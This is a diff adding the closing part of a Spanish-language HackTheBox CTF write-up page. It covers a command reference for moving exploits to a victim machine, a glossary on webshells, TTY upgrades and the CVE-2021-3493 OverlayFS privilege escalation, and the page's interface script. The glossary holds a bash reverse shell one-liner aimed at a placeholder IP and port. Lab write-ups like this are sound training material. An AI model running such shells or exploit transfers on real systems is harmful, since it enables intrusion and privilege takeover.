+            <li><span>-static</span> &mdash; Incluye todas las libs en el binario (portátil)</li>
+            <li><span>-o nombre</span> &mdash; Nombre del binario de salida</li>
+            <li><span>-O2</span> &mdash; Optimización nivel 2</li>
+            <li><span>-Wall</span> &mdash; Muestra todos los warnings</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">python3 -m http.server</div>
+          <div class="cmd-ref-syntax">python3 -m http.server [puerto]</div>
+          <div class="cmd-ref-desc">Levanta un servidor HTTP en el directorio actual. Permite transferir archivos desde la máquina atacante a la víctima sin necesidad de instalar nada.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>8000</span> &mdash; Puerto por defecto (puede ser cualquiera)</li>
+            <li><span>--bind IP</span> &mdash; Escucha solo en una interfaz específica</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">wget</div>
+          <div class="cmd-ref-syntax">wget [URL]</div>
+          <div class="cmd-ref-desc">Descarga archivos desde URLs HTTP/HTTPS/FTP. Disponible en casi todos los sistemas Linux por defecto, ideal para transferir exploits a la víctima.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-O nombre</span> &mdash; Guardar con nombre específico</li>
+            <li><span>-q</span> &mdash; Modo silencioso (sin output)</li>
+            <li><span>-P /ruta</span> &mdash; Guardar en directorio específico</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">chmod</div>
+          <div class="cmd-ref-syntax">chmod [permisos] [archivo]</div>
+          <div class="cmd-ref-desc">Cambia los permisos de acceso a archivos y directorios en Linux. Los archivos descargados no tienen permisos de ejecución por defecto.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>+x</span> &mdash; Añade permiso de ejecución a todos</li>
+            <li><span>755</span> &mdash; rwxr-xr-x (owner ejecuta, otros leen)</li>
+            <li><span>777</span> &mdash; rwxrwxrwx (todos pueden todo)</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">whoami / cat</div>
+          <div class="cmd-ref-syntax">whoami &nbsp;|&nbsp; cat [archivo]</div>
+          <div class="cmd-ref-desc"><strong>whoami</strong> imprime el nombre del usuario actual — esencial para verificar si se logró la escalada. <strong>cat</strong> concatena y muestra el contenido de archivos de texto.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>cat -n</span> &mdash; Muestra con números de línea</li>
+            <li><span>cat -A</span> &mdash; Muestra caracteres especiales</li>
+          </ul>
+        </div>
+
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- GLOSARIO -->
+    <div class="section" id="glosario">
+      <p class="section-label">// 10</p>
+      <h2 class="section-title">Glosario</h2>
+      <div class="section-line"></div>
+
+      <div class="glosario-grid">
+
+        <div class="glos-card">
+          <div class="glos-term">RCE — Remote Code Execution</div>
+          <div class="glos-def">Una de las vulnerabilidades más críticas en seguridad web. Ocurre cuando un atacante puede ejecutar comandos arbitrarios en el servidor remoto. En este caso, la WebShell del puerto 80 era esencialmente un RCE intencional — una aplicación web diseñada para ejecutar comandos como parte del desafío CTF. En entornos reales, los RCE pueden ocurrir por inyección de comandos, deserialización insegura, o subida de archivos maliciosos.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">WebShell</div>
+          <div class="glos-def">Una <strong>webshell</strong> es un script malicioso (PHP, Python, JSP, ASP, etc.) subido a un servidor web que permite al atacante ejecutar comandos del sistema operativo mediante peticiones HTTP. En ataques reales, se suben explotando vulnerabilidades en formularios de subida de archivos o en aplicaciones web desactualizadas. La interfaz de HackTheBox WebShell simula este escenario de forma controlada y educativa.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Reverse Shell vs Bind Shell</div>
+          <div class="glos-def">Existen dos tipos principales de shells remotas. Una <strong>bind shell</strong> hace que la víctima abra un puerto y espere conexiones del atacante — fácil de bloquear con firewalls de entrada. Una <strong>reverse shell</strong> hace que la <em>víctima se conecte al atacante</em>, aprovechando que los firewalls generalmente son más permisivos con el tráfico saliente. En esta máquina se usa reverse shell con <code>bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1</code>.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">TTY — Teletypewriter</div>
+          <div class="glos-def">Un <strong>TTY</strong> es una interfaz terminal que permite la comunicación interactiva con el sistema. Las reverse shells básicas no tienen TTY asociado, lo que limita funcionalidades: no funciona <code>su</code>, <code>sudo</code>, ni editores de texto. Se puede mejorar ejecutando <code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code> seguido de <code>stty raw -echo; fg</code> para obtener una shell completamente interactiva.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">LPE — Local Privilege Escalation</div>
+          <div class="glos-def">La <strong>escalada de privilegios local</strong> es el proceso mediante el cual un usuario con acceso limitado al sistema (como www-data) obtiene permisos de superusuario (root). Puede lograrse explotando vulnerabilidades del kernel (como CVE-2021-3493), configuraciones incorrectas de sudo, archivos SUID mal configurados, cron jobs explotables, o contraseñas débiles. Es la segunda fase del ataque después de obtener acceso inicial.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">CVE-2021-3493 — OverlayFS Ubuntu LPE</div>
+          <div class="glos-def"><strong>CVE-2021-3493</strong> es una vulnerabilidad de escalada de privilegios local en el kernel de Linux (OverlayFS) que afecta específicamente a Ubuntu. La causa raíz: Ubuntu aplica un parche propio al kernel que permite a usuarios sin privilegios crear <em>user namespaces</em> y montar filesystems overlay. Dentro de un namespace, el proceso tiene privilegios de "root" en ese entorno aislado, pero el kernel no valida correctamente las <em>file capabilities</em> establecidas en binarios dentro del overlay cuando se ejecutan fuera del namespace, permitiendo heredar privilegios reales del sistema.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">OverlayFS — Overlay Filesystem</div>
+          <div class="glos-def"><strong>OverlayFS</strong> es un tipo de union mount filesystem en Linux que permite superponer (overlay) múltiples directorios y presentarlos como uno solo. Funciona con dos capas: una <em>lower layer</em> (solo lectura) y una <em>upper layer</em> (escritura). Los cambios se escriben en la upper layer sin modificar la lower. Es la tecnología que usa Docker internamente para las imágenes de contenedores. La vulnerabilidad CVE-2021-3493 explota el comportamiento de este filesystem cuando se usa dentro de user namespaces.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">User Namespaces en Linux</div>
+          <div class="glos-def">Los <strong>user namespaces</strong> son una característica del kernel de Linux que permite aislar identificadores de usuario (UIDs/GIDs). Dentro de un user namespace, un proceso puede aparecer como root (UID=0) mientras en el sistema real es un usuario normal. Esto es útil para contenedores sin privilegios (rootless containers). Sin embargo, combinados con la vulnerabilidad OverlayFS, permiten el exploit CVE-2021-3493: el proceso aparece como root dentro del namespace y puede manipular file capabilities que luego se heredan en el sistema real.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">File Capabilities (Capacidades de Archivo)</div>
+          <div class="glos-def">En Linux, las <strong>file capabilities</strong> permiten dar a ejecutables específicos poderes granulares de root sin darles el UID=0 completo. Por ejemplo, <code>CAP_NET_BIND_SERVICE</code> permite a <code>nginx</code> escuchar en el puerto 80 sin ser root, y <code>CAP_SETUID</code> permite cambiar el UID del proceso. El exploit CVE-2021-3493 establece capabilities elevadas en un binario dentro del overlay, que luego se heredan incorrectamente al ejecutarse en el contexto del sistema real.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Binario Estático vs Dinámico</div>
+          <div class="glos-def">Un <strong>ejecutable dinámico</strong> (compilado sin <code>-static</code>) depende de bibliotecas compartidas del sistema (<code>glibc</code>, <code>libpthread</code>, etc.) que deben estar instaladas en la máquina donde se ejecuta. Un <strong>ejecutable estático</strong> (compilado con <code>gcc -static</code>) incluye todas las bibliotecas necesarias dentro del propio binario. Es más grande (~800KB vs ~20KB) pero funciona en cualquier Linux con la misma arquitectura, sin importar las bibliotecas instaladas — esencial al transferir exploits a máquinas víctima.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">CTF — Capture The Flag</div>
+          <div class="glos-def">Los <strong>CTF</strong> son competencias de ciberseguridad donde los participantes resuelven desafíos técnicos para encontrar cadenas de texto ocultas llamadas "flags". En plataformas como HackTheBox, las flags son hashes MD5 (como <code>2c0477a3ad5052f680217c5c2209ca5c</code>) ubicados en archivos específicos del sistema (<code>user.txt</code> y <code>root.txt</code>). Obtener la user flag requiere acceso inicial; la root flag requiere escalada de privilegios completa.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Apache httpd — Servidor Web</div>
+          <div class="glos-def"><strong>Apache HTTP Server</strong> es el servidor web de código abierto más usado en el mundo. En Ubuntu, corre por defecto como el usuario <strong>www-data</strong> por razones de seguridad. En esta máquina, Apache 2.4.41 sirve la WebShell en el puerto 80. La versión 2.4.41 no tiene vulnerabilidades críticas conocidas — el vector de entrada fue la aplicación web (WebShell) y no el servidor en sí.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">ICMP — TTL y Fingerprinting de OS</div>
+          <div class="glos-def"><strong>ICMP (Internet Control Message Protocol)</strong> es el protocolo usado por <code>ping</code>. El campo <strong>TTL (Time To Live)</strong> indica el número máximo de saltos que puede dar un paquete antes de ser descartado. Cada router decrementa el TTL en 1. Los sistemas operativos usan TTL iniciales distintos: <strong>Linux: 64</strong>, <strong>Windows: 128</strong>, <strong>Cisco: 255</strong>. Al recibir un TTL=63, sabemos que el paquete viajó 1 salto y el OS origen tenía TTL inicial de 64 → es Linux.</div>
+        </div>
+
+      </div>
+    </div>
+
+  </main>
+</div>
+
+<!-- FOOTER -->
+<footer>
+  <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup personal · HackTheBox</p>
+  <p>Built with <span>kali linux</span> &amp; <span>❤</span></p>
+</footer>
+
+<script>
+  // ACTIVE TOC
+  const sections = document.querySelectorAll('.section[id]');
+  const tocLinks = document.querySelectorAll('.toc-list a');
+  const tocObserver = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const active = document.querySelector(`.toc-list a[href="#${e.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-30% 0px -60% 0px' });
+  sections.forEach(s => tocObserver.observe(s));
+
+  // CURSOR
+  const cursor = document.getElementById('cursor');
+  const ring   = document.getElementById('cursorRing');
+  document.addEventListener('mousemove', e => {
+    cursor.style.left = e.clientX + 'px'; cursor.style.top = e.clientY + 'px';
+    ring.style.left   = e.clientX + 'px'; ring.style.top   = e.clientY + 'px';
+    cursor.style.opacity = '1'; ring.style.opacity = '0.5';
+  });
+  document.addEventListener('mousedown', () => { cursor.style.transform = 'translate(-50%,-50%) scale(0.5)'; });
+  document.addEventListener('mouseup',   () => { cursor.style.transform = 'translate(-50%,-50%)'; });
+  document.querySelectorAll('a, button').forEach(el => {
+    el.addEventListener('mouseenter', () => { ring.style.width = '54px'; ring.style.height = '54px'; ring.style.opacity = '0.3'; });
+    el.addEventListener('mouseleave', () => { ring.style.width = '36px'; ring.style.height = '36px'; ring.style.opacity = '0.5'; });
+  });
+
+  // SCROLL REVEAL
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+  }, { threshold: 0.06 });
+  document.querySelectorAll('.section').forEach(s => obs.observe(s));
+
+  // PROGRESS BAR
+  window.addEventListener('scroll', () => {
+    const winScroll = document.documentElement.scrollTop;
+    const height = document.documentElement.scrollHeight - window.innerHeight;
+    const scrolled = height > 0 ? (winScroll / height) * 100 : 0;
+    const bar = document.getElementById('readingProgress');
+    if (bar) bar.style.width = scrolled + '%';
+  });
+
+  // TOAST
+  function showToast(msg) {
+    let toast = document.querySelector('.toast');
+    if (!toast) {
+      toast = document.createElement('div');
+      toast.className = 'toast';
+      document.body.appendChild(toast);
+    }
+    toast.textContent = '📋 ' + msg;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2000);
+  }
+
+  // COPY COMMAND
+  function copyCmd(btn) {
+    const block = btn.closest('.cmd-block');
+    const cmd = block.dataset.cmd || '';
+    navigator.clipboard.writeText(cmd).then(() => {
+      btn.textContent = '✓ OK';
+      btn.classList.add('copied');
+      showToast('Comando copiado ✓');
+      setTimeout(() => {
+        btn.textContent = 'COPY';
+        btn.classList.remove('copied');
+      }, 1800);
+    }).catch(() => {
+      showToast('Error al copiar');
+    });
+  }
+</script>
+</body>
+</html>
